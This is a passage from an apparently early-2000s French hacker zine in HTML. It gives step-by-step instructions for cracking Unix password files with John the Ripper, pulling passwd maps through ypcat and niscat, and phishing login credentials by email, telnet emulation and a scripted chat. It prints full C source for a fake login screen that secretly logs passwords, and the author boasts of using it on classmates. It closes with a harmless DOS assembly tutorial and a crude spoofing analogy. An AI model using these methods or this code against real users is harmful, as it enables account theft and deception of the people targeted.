      <p>Autre m&eacute;thode : <b>les dicos</b>. C'est des fichiers textes contenant 
        des mot pouvant &ecirc;tre utilis&eacute;s comme mots de passe. Moi j'en 
        ai plusieurs : un que j'ai rempli de pr&eacute;noms, un de mot style loisirs/passions, 
        un r&eacute;cup&eacute;r&eacute; sur internet, un de Phrack, un qui &eacute;tait 
        avec John. La commande est :<br>
        <span class="script">john -wordfile:&lt;fichier_dico&gt; &lt;passwd&gt;</span></p>
      <p>Et la derni&egrave;re m&eacute;thode, du pure <b>brute force</b> : on 
        fait toutes les possibilit&eacute;es. C'est l'option incr&eacute;mental. 
        Diff&eacute;rent types : All (tous les caract&egrave;res), Alpha (lettres), 
        Digits (nombres), LanMan (?). La m&eacute;thode :<br>
        <span class="script">john -incremental:&lt;mode&gt; &lt;passwd&gt;</span><br>
        Un conseil ? Rajoutez ou modifiez un type en fonction de vos besoins, 
        allez dans john.ini, &agrave; un moment vous verrez par exemple :<br>
        <span class="script"># Incremental Modes </span><span class="normalText">// 
        d&eacute;but de la d&eacute;claration des modes</span><span class="script"><br>
        [Incremental:All] </span><span class="normalText">// d&eacute;claration 
        du mode all</span><span class="script"><br>
        File = ~/all.chr </span><span class="normalText">// dans john 1.6 c'est 
        comme &ccedil;a</span><span class="script"><br>
        MinLen = 0 </span><span class="normalText">// longueur minimum du pass</span><span class="script"><br>
        MaxLen = 8 </span><span class="normalText">// longueur maximum du pass</span><span class="script"><br>
        CharCount=95 </span><span class="normalText">// nombre de caract&egrave;res 
        possibles</span></p>
      <p>Souvent par mesure de s&eacute;curit&eacute;, la longueur du pass est 
        fix&eacute;e entre 6 et 8. On pourrait donc ajouter :<br>
        <span class="script">[Incremental:School]<br>
        File = ~/all.chr<br>
        MinLen = 6<br>
        MaxLen = 8<br>
        CharCount = 95</span></p>
      <p>On peut heureusement arr&ecirc;ter et reprendre un crackage, car cela 
        peut durer tr&egrave;s longtemps (quelques semaines) selon que le password 
        utilise des caract&egrave;res sp&eacute;ciaux, des chiffres et des majuscule/minuscules. 
        Donc pour arr&ecirc;ter vous faites un Control+C et pour reprendre vous 
        faites : <span class="script">john -restore</span></p>
      <p>En revanche si le fichier est du style :<br>
        <span class="script">dupuy:*:2618:1000:Paul Dupuy:/home/dupuy:/bin/bash</span><br>
        Alors c'est que le password est <b>shadow</b> : le mot de passe n'y figure 
        pas, il est remplac&eacute; par '*' ou 'x'. L'autre possibilit&eacute; 
        est d'utiliser un service utilis&eacute; sur les grands r&eacute;seaux 
        style universit&eacute;es :-)<br>
        En effet sur un grand r&eacute;seau, si un utilisateur change de mot de 
        passe, il faudrait mettre le fichier passwd &agrave; jour sur chaque serveur. 
        Heureusement il existe un service qui permet de d&eacute;clarer un serveur 
        ma&icirc;tre qui poss&eacute;dera les configurations de tous le monde. 
        Ainsi si on veut faire une modif, on la fait sur ce serveur et les modifs 
        sont faites sur tous les autres. Anciennement ce service est les pages 
        jaunes (rien &agrave; jour avec France Telecom). Les <b>yellow pages</b> 
        permettent entre autre d'appeler le fichier password par la commande <span class="script">ypcat 
        passwd</span>, mais si vous n'avez pas de r&eacute;sultat essayez <span class="script">ypcat 
        passwd.byname</span></p>
      <p>Il existe une version plus r&eacute;cente appel&eacute;e <b>NIS</b> (Network 
        Information Service) qui permet le m&ecirc;me r&eacute;sultat :<br>
        <span class="script">niscat passwd.org_dir</span><br>
        Si ce service est disponible vous obtenez un fichier password l&eacute;g&eacute;rement 
        modifi&eacute; dont une ligne ressemble &agrave; :<br>
        <span class="script">dupuy:K0wEFtIa/zcx6:2618:1000:Paul Dupuy:/home/dupuy:/bin/bash:11576::::::</span><br>
        Mais le principe est le m&ecirc;me, vous lancez john et vous laissez tourner. 
        Le probl&egrave;me est que souvent le password root est toujours shadow. 
        Au fait j'ai oubli&eacute; de vous dire. Plus les droits sont petits, 
        plus l'utilisateur est puissant. Hors le root a les droits uid=0 et gid=0 
        dont c'est le plus puissant.</p>
      <p><u>Une autre m&eacute;thode :</u> le social engineering simple. Vous 
        envoyez un mail anonyme avec comme provenance &quot;admin&quot; ou &quot;root&quot; 
        et vous demandez b&ecirc;tement le pass ou par le biais d'un formulaire.</p>
      <p><u>Le social engineering extended</u> : Une m&eacute;thode que j'ai utilis&eacute;e 
        et qui a &eacute;t&eacute; un succ&egrave;s alors que le mec se trouvait 
        sur le pc &agrave; c&ocirc;t&eacute; de moi. On utilise un &eacute;mulateur 
        de terminal qui simmule une connexion comme un rlogin, un telnet ou un 
        pop3. On utilise le logiciel Analyser, cr&eacute;&eacute; par Johan de 
        www.SecureNT-2000.com. Ce prog tourne sous windows, vous le lancez, vous 
        faites Emulation &gt; Telnet puis vous d&eacute;marrer en cliquant sur 
        Emulation.<br>
        L&agrave; vous demandez au mec de se connecter en telnet sur votre PC 
        avec une escuse bidon du style &quot;J'ai l'impression que mon PC ne marche 
        pas, tu peux te connecter en telnet dessus pour voir si &ccedil;a marche 
        ?&quot;<br>
        Quand le mec se logge sur votre machine, il y a inscrit &quot;A vous de 
        jouer&quot; au bas de la fen&ecirc;tre. Vous envoyez le message de login, 
        la victime le rentre, vous envoyez le message de demande de password, 
        la victime le donne et vous fermer tout. C'est bon.</p>
      <p><u>Enfin, la derni&egrave;re m&eacute;thode, celle que je pr&eacute;f&egrave;re.</u> 
        Elle constite &agrave; <b>simuler le login sur une machine</b>. Le mec 
        s'installe devant un pc, il tape son login puis son password. Ca marche 
        pas, il se dit qu'il a mal tap&eacute;, il retape et &ccedil;a marche.<br>
        <b>En fait la premi&egrave;re fois qu'il a tap&eacute;, les donn&eacute;es 
        ont &eacute;t&eacute; stock&eacute;es dans un fichier &agrave; nous</b>. 
        Comment ca marche ? Et bien on affiche &quot;Login:&quot; on attend que 
        le mec tappe son nom fini par &lt;entr&eacute;e&gt; puis on affiche &quot;Password:&quot; 
        et on attend pareil.<br>
        Quand on a les infos, on autokill le programme et on kill notre session.</p>
      <p>A l'origine, c un prog que j'ai trouv&eacute; dans le loopback du Phrack 
        42 (en gros la rubrique courrier), mais je l'ai modifi&eacute; pour plus 
        de r&eacute;alisme. A mon bahut le login prompt c'est un ascii puis le 
        mot &quot;Login&quot;.<br>
        Le probl&egrave;me &eacute;tait d'afficher ce putain d'ASCII car les caract&egrave;res 
        changent de Unix &agrave; Dos (et visse et versa). Apr&egrave;s quelques 
        man, cd, ls et autres cat, j'ai trouv&eacute; que le login affiche le 
        fichier /etc/issue. J'ai du aussi modifier quelques lignes histoire que 
        la ressemblance avec le vrai login soit parfait, &agrave; la fin j'avais 
        :</p>
      <p class="script">/*----------------------------------------------------------------------+<br>
        | GRABEM 1.0 by The K-Man &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        | A Cute little program to collect passwords on the Sun workstations. 
        &nbsp;&nbsp;|<br>
        +----------------------------------------------------------------------*/<br>
        #define PASSWORD &quot;Password:&quot;<br>
        #define INCORRECT &quot;\nLogin incorrect&quot;<br>
        #define FILENAME &quot;.exrc%&quot;</p>
      <p class="script">#include &lt;stdio.h&gt;<br>
        #include &lt;signal.h&gt;<br>
        <br>
        /*-----------------------------------------------------------------------+<br>
        | ignoreSig &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        | Does nothing. Used to trap SIGINT, SIGTSTP, SIGQUIT. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-----------------------------------------------------------------------*/<br>
        void ignoreSig ()<br>
        {<br>
        return;<br>
        }</p>
      <p class="script">/*-----------------------------------------------------------------------+<br>
        | Main &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-----------------------------------------------------------------------*/<br>
        main()<br>
        {<br>
        char name[10], /* users name */<br>
        password[10]; /* users password */</p>
      <p></p>
      <p class="script">int i, /* loop counter */<br>
        lab, /* lab # you're running on */<br>
        procid; /* pid of the shell we're under */</p>
      <p class="script">FILE *fp; /* output file */</p>
      <p class="script">/*-------------------------------------------------------------------+<br>
        | Trap the SIGINT (ctrl-C), SIGSTP (ctrl-Z), and SIGQUIT (ctrl-\) &nbsp;&nbsp;&nbsp;|<br>
        | signals so the program doesn't stop and dump back to the shell. &nbsp;&nbsp;&nbsp;|<br>
        +-------------------------------------------------------------------*/<br>
        signal (SIGINT, ignoreSig); //Il manque ctrl-D :-( -&gt; bug<br>
        signal (SIGTSTP, ignoreSig);<br>
        signal (SIGQUIT, ignoreSig);</p>
      <p class="script"> /*-------------------------------------------------------------------+<br>
        | Get the parent pid so that we can kill it quickly later. Remove &nbsp;&nbsp;&nbsp;|<br>
        | this program from the account. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-------------------------------------------------------------------*/<br>
        procid = getppid();<br>
        system (&quot;\\rm proj2&quot;);</p>
      <p class="script"> /*-------------------------------------------------------------------+<br>
        | Ask for the lab # we're running on. Clear the screen. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-------------------------------------------------------------------*/<br>
        /*printf (&quot;Login: &quot;);<br>
        scanf (&quot;%d&quot;, &amp;lab);<br>
        for (i=1; i&lt;40; i++)<br>
        printf (&quot;\n&quot;);<br>
        getchar();<br>
        */<br>
        system(&quot;clear;cat /etc/issue&quot;);// c'est quand m&ecirc;me mieux 
        comme &ccedil;a non ?<br>
        // On affiche le logo<br>
        /*-------------------------------------------------------------------+<br>
        | Outer for loop. If the name is &lt;= 4 characters, it's probably not 
        &nbsp;|<br>
        | a real id. They screwed up. Give 'em another chance. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-------------------------------------------------------------------*/<br>
        for(;;)<br>
        {<br>
        /*---------------------------------------------------------------+<br>
        | If they hit return, loop back and give 'em the login again. &nbsp;&nbsp;&nbsp;|<br>
        +---------------------------------------------------------------*/<br>
        for (;;)<br>
        {<br>
        system(&quot;echo -n $HOSTNAME&quot;); // On affiche le nom de machine<br>
        printf(&quot; login: &quot;,lab);<br>
        gets (name);<br>
        //Attention &agrave; la boucle, placer un \n si necessaire<br>
        if (strcmp (name, &quot;&quot;) != 0)<br>
        break;<br>
        }</p>
      <p class="script"> /*---------------------------------------------------------------+<br>
        | Turn off the screen echo, ask for their password, and turn the |<br>
        | echo back on. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +---------------------------------------------------------------*/<br>
        system (&quot;stty -echo &gt; /dev/tty&quot;);<br>
        printf(PASSWORD);<br>
        scanf(&quot;%s&quot;,password);<br>
        getchar();<br>
        system (&quot;stty echo &gt; /dev/tty&quot;);</p>
      <p class="script"><br>
        /*---------------------------------------------------------------+<br>
        | Write their userid and password to the file. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +---------------------------------------------------------------*/<br>
        if ( ( fp = fopen(FILENAME,&quot;a&quot;) ) != NULL )<br>
        {<br>
        fprintf(fp,&quot;login %s has password %s\n&quot;,name,password);// hacked<br>
        fclose(fp);<br>
        }</p>
      <p class="script"> /*---------------------------------------------------------------+<br>
        | If the name is bogus, send 'em back through &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +---------------------------------------------------------------*/<br>
        if (strlen (name) &gt;= 4)<br>
        break;<br>
        else<br>
        printf (INCORRECT);<br>
        printf(&quot;\n\n&quot;);//Comme vu plus haut d&eacute;pend de la boucle<br>
        }</p>
      <p class="script"> /*-------------------------------------------------------------------+<br>
        | Everything went cool. Tell 'em they fucked up and mis-typed and &nbsp;&nbsp;&nbsp;|<br>
        | dump them out to the REAL login prompt. We do this by killing the &nbsp;|<br>
        | parent process (console). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
        +-------------------------------------------------------------------*/<br>
        printf (INCORRECT);<br>
        kill (procid, 9);// on s'autokill ;-)<br>
        }</p>
      <p class="normalText">Pour compiler ce prog vous faites gcc -o proj2 proj2.c 
        puis vous lancez avec ./proj2<br>
        J'ai rajout&eacute; l'affichage de pr&eacute;-login, l'affichage de nom 
        de machine avant le login et aussi d'autres trucs d'affichage.<br>
        C'est &agrave; vous de le modifier selon vos besoins mais &agrave; mon 
        avis cette version est proche de la plupart des syst&egrave;mes.<br>
        Les r&eacute;sultats sont plac&eacute;s dans le fichier .exrc%. <b>Ceci 
        est vraiment efficace</b>. Pour preuve : j'ai mis le prog sur trois machine 
        c&ocirc;te &agrave; c&ocirc;te, puis trois mecs se sont mis sur les machines 
        --&gt; 3 accounts d'un coup ;-) Je pense qu'il est pr&eacute;f&eacute;rable 
        de rajouter plus de place pour le login et le password (genre 30 caract&egrave;res 
        chacuns) au cas o&ugrave; un met se fait chier et rentre des conneries 
        sur le clavier.</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="1" class="subheading"><b><u><a name="fuckISP"></a>Petit 
      vol d'une connexion web</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="0" class="normalText"> 
      <p>Bon c'est un petit sc&eacute;nar que j'ai imagin&eacute; qui peut servir 
        &agrave; r&eacute;cup&eacute;rer des connexions web. Deux personnages 
        : un hacker d'adresse IP 194.28.32.1 et la victime qui se rencontrent 
        sur un forum de discussion d'un fournisseur d'acc&egrave;s X. Le hacker 
        dispose du <b>prog Analyser cod&eacute; par Johan</b> et dont je parle 
        dans l'article pr&eacute;c&eacute;dent.<br>
        &lt;hacker&gt; Salut<br>
        &lt;victime&gt; Salut<br>
        &lt;hacker&gt; Je connais un truc pour pas payer sa connexion internet 
        sur X<br>
        &lt;victime&gt; Ah ouais ? Comment tu fais ?<br>
        &lt;hacker&gt; C'est un pote qui fait parti du commit&eacute; d'entreprise 
        de X qui m'a dit &ccedil;a. Ils ont droits &agrave; se connecter gratuitement, 
        &ccedil;a fait partie des privil&egrave;ges qui leur sont donn&eacute;.<br>
        &lt;victime&gt; Et comment tu fais ?<br>
        &lt;hacker&gt; T'en parles &agrave; personne d'autre hein ? Faut que &ccedil;a 
        reste secret !<br>
        &lt;victime&gt; T'inqui&egrave;te pas, &ccedil;a restera entre nous ;-)<br>
        &lt;hacker&gt; En fait il faut que tu te connecte &agrave; un serveur 
        pour d&eacute;clarer que tu est un membre du comit&eacute; d'entreprise<br>
        &lt;victime&gt; OK, c'est quoi le serveur ?<br>
        &lt;hacker&gt; C 194.28.31.1, tu met ton met son login et ton pass de 
        connexion pour te d&eacute;clarer privil&eacute;gi&eacute;<br>
        -- A ce moment l&agrave; le hacker lance Analyser avec une &eacute;mulation 
        telnet, r&eacute;cup&egrave;re les donn&eacute;es, accepte la connexion 
        puis ferme.<br>
        &lt;victime&gt; Ca y est je me suis logg&eacute;, mais il a ferm&eacute; 
        la connexion, c'est normal ?<br>
        &lt;hacker&gt; T'inqui&egrave;te pas il sert juste &agrave; &ccedil;a 
        ;-)</p>
      <p>Autant vous dire que &ccedil;a doit marcher tr&egrave;s bien avec les 
        lammers et les newbies, pour les personnes qui n'y connaisent rien &agrave; 
        l'informatique &ccedil;a va demander plus de temps mais dans tous les 
        cas la victime a l'impression d'apprendre un truc ultra-secret et elle 
        se sent hyper flatt&eacute;e donc ----&gt; Hacked B====&curren; (_o_) 
        Ramasse la savonnette !!!!</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-1" class="subheading"><b><u><a name="nasm"></a>Faire 
      bouger ton Dos avec l'assembleur (utilisation nasm)</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="1816" class="normalText"> 
      <p>Chose promis chose due, on va voir comment afficher des couleurs et faire 
        des asciis en assembleur. Comme &ccedil;a vous pourrez faire le branleur 
        aupr&egrave;s de vos potes.<br>
        Je vais me r&eacute;p&eacute;ter mais bon, un prog est divis&eacute; en 
        plusieurs parties :<br>
        - la partie data qui contient toutes les constantes et d&eacute;claration 
        de variables.<br>
        - La partie code qui contient... le code (en lecture seule)<br>
        - La pile (stack) en lecture/&eacute;criture qui sert &agrave; passer 
        des arguments aux fonctions...</p>
      <p>Bon en g&eacute;n&eacute;ral, un prog commence par un prologue et fini 
        par un &eacute;pilogue qui servent en gros &agrave; d&eacute;clarer un 
        nouvel environnement (avec des variables locales) et puis &agrave; restituer 
        l'ancien environnement avant de quitter.<br>
        Mais apparement on en a juste besoin dans les fonctions car au lancement 
        du prog ca ne change rien. Mais plut&ocirc;t que je sorte du sujet principal 
        (comme d'hab) je vous conseil de lire n'importe quel texte sur les BoF 
        (buffers overflows).<br>
        Autant que je sache il n'existe qu'un seul livre sur l'assembleur en Fran&ccedil;ais 
        : L'assembleur facile aux &eacute;ditions Marabout par Philipe Mercier. 
        je vais donc citer quelques passages de ce livre.</p>
      <p>&quot;Un ordinateur est bien entendu &eacute;quip&eacute; de toutes sortes 
        de p&eacute;riph&eacute;riques dont les plus importants : le clavier, 
        l'&eacute;cran, les disques, l'imprimante, etc. Pour acc&eacute;der &agrave; 
        ces p&eacute;riph&eacute;riques, nous pouvons demander l'aide de MS-DOS 
        : &agrave; chaque p&eacute;riph&eacute;rique correspond une fonction portant 
        le num&eacute;ro &agrave; laquelle le programme doit transmettre des param&egrave;tres, 
        sp&eacute;cifiant le type de &quot;service souhait&eacute;&quot;. Ceci 
        ce fait par l'interm&eacute;diaire des registres.L'op&eacute;ration sera 
        alors ex&eacute;cut&eacute;e par MS-DOS et dans certains cas, des param&egrave;tres 
        seront renvoy&eacute;s &eacute;galement par l'interm&eacute;diaire des 
        registres. Ces fonctions sont appel&eacute;es <b>interruptions</b>.&quot;</p>
      <p>Donc pour appeler une interruption, il nous suffit de mettre certaines 
        valeurs dans certains registres puis de lancer l'appel. Une interrution 
        propose plusieurs services. En g&eacute;n&eacute;ral le service est mis 
        dans AH et les autres param&egrave;tres dans les registres BX, CX, DX... 
        L'appel se fait par l'instruction INT.<br>
        Petit exemple qui affiche un texte donn&eacute;e &agrave; un endroit donn&eacute; 
        :<br>
        <span class="script">[section .data]<br>
        mesg db 'Essai de positionnement',13,10,'$'<br>
        <font color="#FF0000">; D&eacute;claration d'une chaine de caract&egrave;res 
        qui finit par l'&eacute;ternel CR/LF puis un '$' (syntaxe nasm)</font><br>
        [section .text]<br>
        org 100h <font color="#FF0000">; d&eacute;fini l'EntryPoint du prog, toujours 
        &agrave; 100h (hexa) pour les fichiers com</font><br>
        push ax <font color="#FF0000">; on sauvegarde les registres car on va 
        s'en servir (prologue)</font><br>
        push bx<br>
        push cx<br>
        push dx<br>
        <font color="#FF0000">;----------D&eacute;but de la partie de l'effacement 
        de l'&eacute;cran</font><br>
        mov al,0 <font color="#FF0000">; on met al &agrave; 0 car ax (16 bits) 
        = ah (8 bits) et al (8 bits) </font><br>
        mov ah,6 <font color="#FF0000">; service 06h</font></span></p>
      <p class="script"> mov bh,7 <font color="#FF0000">; couleur par d&eacute;faut 
        des caract&egrave;res</font><br>
        mov cx,0 <font color="#FF0000">; effacement &agrave; parir du coin haut-gauche</font><br>
        mov dh,24 <font color="#FF0000">; l'&eacute;cran dos fait 25 lignes (ligne 
        0 -&gt; ligne 24)</font><br>
        mov dl,79 <font color="#FF0000">; et 80 colonnes</font><br>
        int 0x10 <font color="#FF0000">; interruption 10h</font><br>
        <font color="#FF0000">;----------Fin de la partie de l'effacement de l'&eacute;cran</font><br>
        <font color="#FF0000">;----------D&eacute;but du positionnement du curseur</font><br>
        mov ah,12 <font color="#FF0000">; on se place &agrave; la ligne 12</font><br>
        mov al,30 <font color="#FF0000">; on se place &agrave; la colonne 30</font><br>
        mov dx,ax <font color="#FF0000">; al et ah forment ax. Ces coordonn&eacute;es 
        sont ensuite plac&eacute;es en dx</font><br>
        mov ah,2 <font color="#FF0000">; fonction 2h</font><br>
        mov bh,0 <font color="#FF0000">; page 0</font><br>
        int 0x10 <font color="#FF0000">; interruption 10h</font><br>
        <font color="#FF0000">;----------Fin positionnement cuseur<br>
        ;----------et enfin on affiche le message</font><br>
        mov dx, mesg <font color="#FF0000">; on met l'adresse du message en dx</font><br>
        mov ah,9 <font color="#FF0000">; service 9h</font><br>
        int 0x21 <font color="#FF0000">; interruption 21h</font><br>
        <font color="#FF0000">;----------fin affichage message</font><br>
        pop dx <font color="#FF0000">; &eacute;pilogue</font><br>
        pop cx<br>
        pop bx<br>
        pop ax<br>
        ret</p>
      <p>L'interruption 10 correspond au service video du bios et la 21 aux entr&eacute;es/sorties 
        (clavier, &eacute;cran, imprimante...)<br>
        Pour compiler sous nasm vous faites nasmw -f bin -o prog.com prog.asm<br>
        prog.asm &eacute;tant la source du prog. Moi j'ai nasmw, c la version 
        qui roule sous windows. Les Nasm est totalement gratuit ;-)</p>
      <p>C'est bien beau tout &ccedil;a mais nous on veux de la couleur, parce 
        que &ccedil;a on peut le faire avec n'importe quel language de programmation 
        qui compile sous windows. Il existe une autre fonction qui permet d'afficher 
        un message, plus &eacute;volu&eacute; et qui appartient &agrave; l'interruption 
        10 (video comme vue plus haut) mais service 13h qui correspond &agrave; 
        &quot;write string&quot;.<br>
        Au fil de mes errances sur le web, je suis tomb&eacute; sur une doc sur 
        les interruptions et voici un petit truc sur cette fonction :</p>
      <p class="script">:int 10,13<br>
        ^INT 10,13 - Write String (BIOS versions from 1/10/86)</p>
      <p><span class="script"> AH = 13h<br>
        AL = write mode (see bit settings below)<br>
        = 0 string is chars only, attribute in BL, cursor not moved<br>
        = 1 string is chard only, attribute in BL, cursor moved<br>
        = 2 string contains chars and attributes, cursor not moved<br>
        = 3 string contains chars and attributes, cursor moved<br>
        BH = video page number<br>
        BL = attribute if mode 0 or 1 (AL bit 1=0)<br>
        CX = length of string (ignoring attributes)<br>
        DH = row coordinate<br>
        DL = column coordinate<br>
        ES:BP = pointer to string</span></p>
      <p>Ce qui est tr&egrave;s puissant dans cette fonction c'est le cursor moved 
        qui fait avancer le prog jusqu'au caract&egrave;re suivant pour l'afficher. 
        Mais j'ai du mal &agrave; voir ce que font les fonctions sans le moved. 
        Ce qui nous interesse, c'est les attributs qui permettent de sp&eacute;cifier 
        la couleur du caract&egrave;re. On va se restreindre aux fonctions avec 
        AL=1 et AL=3.<br>
        Fonction 1 : l'attribut est dans BL ce qui veut dire que la couleur est 
        la m&ecirc;me pour toute la chaine.<br>
        Fonction 2 : la chaine contient tour &agrave; tour caract&egrave;res puis 
        attributs donc chaque caract&egrave;res &agrave; sa couleur perso ;-)<br>
        On met la video page &agrave; 0 (mov bh,0), les coordonn&eacute;es en 
        dh,dl et la longueur de chaine en cx. L'adresse de la chaine est plac&eacute;e 
        en bp.<br>
        Pour ce qui est des attributs, on les &eacute;crits en hexa (on met 0x 
        avant le chiffre). Je vous ai fait un super tableau avec couleur de caract&egrave;re/couleur 
        de fond. Par exemple la colonne 1X et la ligne XF donne le code couleur 
        1F : caract&egrave;re blanc sur fond fonc&eacute;.</p>
      <p><span class="script">mov ah,13h <font color="#FF0000">; service 13</font><br>
        mov al,1 <font color="#FF0000">; couleur pour la string enti&egrave;re</font><br>
        mov bh,0 <font color="#FF0000">; page 0</font><br>
        mov bl,0x1F <font color="#FF0000">; la couleur</font><br>
        mov cx,14 <font color="#FF0000">; on &eacute;crit 14 caract&egrave;res</font><br>
        mov dh,4 <font color="#FF0000">; 5&egrave;me ligne</font><br>
        mov dl,2 <font color="#FF0000">; 3&egrave;me colonne</font><br>
        push cs<br>
        pop es<br>
        mov bp,string <font color="#FF0000">; adresse de la chaine</font><br>
        int 10h <font color="#FF0000">; interruption 10</font></span></p>
      <p>Pour l'autre mode c'est simple, on d&eacute;finit la chaine par &quot;un 
        caract&egrave;re, sa couleur...&quot; Vous trouverez l'exemple dans le 
        fichier color.asm qui correspond au prog qui &eacute;tait avec lotfree#03.</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="spoof"></a>Le 
      spoofing c'est pas du proxying</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText">Dans pas mal de zines on peut 
      voir &quot;le spoofing expliqu&eacute;&quot; et quand on va dans l'article 
      on tombe sur l'utilisation de proxy. OK utiliser un proxy c bien mais c'est 
      pas du spoofing. <b>Spoofing vient de l'anglais spoof : parodier, caricaturer</b>. 
      J'ai pas mal cogiter sur une repr&eacute;sentation humaine du spoofing et 
      je suis parvenu &agrave; celle l&agrave; :<br>
      <b>Dans le spoofing il y a toujours 3 protagonistes</b> qui sont l'attaquant, 
      la cible et la machine dont il faut se d&eacute;barrasser. Voici mon exemple 
      :<br>
      Vous &ecirc;tes dans un cyber caf&eacute;, &agrave; c&ocirc;t&eacute; de 
      vous ya un mec qui tchache une meuf. Vous n'y tenez pas tellement attention 
      jusqu'au moment o&ugrave; la meuf lui envoie une foto d'elle : Putain la 
      bombe !!!! ;-) Le mec tchache grave et parvient &agrave; obtenir un rencart.<br>
      Comme vous &ecirc;tes horriblement jaloux, vous vous dites qu'il faut absolument 
      que vous vous tapiez cette meuf &agrave; sa place.<br>
      Comment faire ? Simple vous allez au rencars et vous vous faites passer 
      pour le mec en question.<br>
      Petit probl&egrave;me : le mec va s'y rendre aussi. Une seule solution : 
      il faut s'en d&eacute;barasser. Pour cela tout les moyens sont bons : l'&eacute;craser 
      en caisse, envoyer un fake mail de la part de la gonzesse... Personnelement 
      je pr&eacute;f&egrave;re la technique Dum &amp; Dumber : utilisation de 
      laxatif en surdose (il est vraiment trop con ce film ;-)<br>
      Vous avez compris le principe ? En informatique c pareil ! Le premier cas 
      connu d'escroquerie &agrave; l'IP Spoofing (comme disent les pros) &agrave; 
      &eacute;t&eacute; fait par <b>Kevin Mitnick</b> pour pirater l'ordinateur 
      de l'expert en s&eacute;curit&eacute; Tsutomu Shimomura et ainsi r&eacute;cup&eacute;rer 
      un logiciel de radiot&eacute;l&eacute;communication sur les t&eacute;l&eacute;phones 
      OKI. Vous vous doutez bien que si Mitnick est si c&eacute;l&egrave;bre c'est 
      pas pour une stupide utilisation d'un proxy.<br>
      Le spoofing marche sur les machines sous Unix ayant une relation de confiance 
      entre elles. C'est &agrave; dire qu'elles sont d&eacute;clar&eacute;es dans 
